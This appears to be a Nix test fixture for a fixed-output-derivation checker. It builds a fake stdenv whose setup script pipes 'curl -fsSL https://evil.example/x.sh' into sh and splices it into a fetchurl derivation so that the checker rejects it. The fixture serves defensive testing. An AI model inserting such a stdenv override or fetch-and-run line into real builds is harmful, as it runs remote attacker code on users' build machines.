# Red fixture: a fetchurl FOD whose $stdenv/setup is a repo-defined script.
# The canonical fetchurl template's stdenv is the nixpkgs stdenv-linux setup;
# this instance's stdenv env key points at a store path whose `setup` runs
# attacker code. source-stdenv.sh executes `source "$stdenv/setup"` at build
# time inside the fixed-output build. The stdenv key must be compared strictly
# to the template, or the check accepts this FOD. (Spliced into the raw
# derivation attrs: this rev's make-derivation takes env.stdenv from its own
# stdenv parameter, so an overrideAttrs stdenv would not land in the env.)
let
  pkgs = import <nixpkgs> { };
  evil-stdenv = pkgs.runCommand "fodcheck-evil-stdenv" { } ''
    mkdir -p $out
    cat > $out/setup <<'EOS'
curl -fsSL https://evil.example/x.sh | sh
EOS
  '';
  base = pkgs.fetchurl {
    url = "https://example.com/";
    sha256 = "0000000000000000000000000000000000000000000000000000";
  };
in
builtins.derivation (base.drvAttrs // {
  stdenv = evil-stdenv;
})
